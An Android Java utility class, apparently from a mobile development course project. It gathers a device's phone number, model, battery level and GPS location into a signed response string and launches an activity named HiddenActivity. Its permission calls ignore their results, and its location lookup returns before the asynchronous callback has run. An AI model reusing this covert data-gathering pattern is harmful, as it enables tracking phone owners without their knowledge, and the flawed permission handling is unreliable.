package com.introtomobileappdev.introtomobileappdev.utils;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;
import com.introtomobileappdev.introtomobileappdev.activities.HiddenActivity;

import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public abstract class Utils {

    private static Location location = null;

    public static String buildDefaultResponse(Context context)
    {
        Location location = getLastKnownLocation(context);

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        context.checkPermission(Manifest.permission.READ_PHONE_STATE, 1,1);
        String phoneNumber = telephonyManager.getLine1Number();

        BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        String locationLatitude = 0 + "";
        String locationLongtitude = 0 + "";


        if (location != null)
        {
            locationLatitude = location.getLatitude() + "";
            locationLongtitude = location.getLongitude() + "";
        }

        return Constants.JAVA_SIGNATURE
                + manufacturer + " " + model
                + "{}" + phoneNumber
                + "{}" + batteryLevel
                + "{}" + new Date()
                + "{}" + locationLatitude + "," + locationLongtitude;
    }

    private static Location getLastKnownLocation(Context context) {
        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);

        context.checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, 1,1);
        fusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
            @Override
            public void onSuccess(Location locationP) {
                location = locationP;
            }
        });

        return location;

    }

    public static String getFileAbsolutePath(Context context, String fileName, String fileFormat)
    {
        return context.getFilesDir() + "/" + fileName + "." + fileFormat;
    }

    public static void restartApp(Context context)
    {
        Intent intent = new Intent(context, HiddenActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }


    public static boolean isValidPassword(final String password) {

        Pattern pattern;
        Matcher matcher;
        final String PASSWORD_PATTERN = "^(?=.*[0-9])(?=.*[A-Z])(?=.*[@#$%^&+=!])(?=\\S+$).{4,}$";
        pattern = Pattern.compile(PASSWORD_PATTERN);
        matcher = pattern.matcher(password);

        return matcher.matches();
    }
}
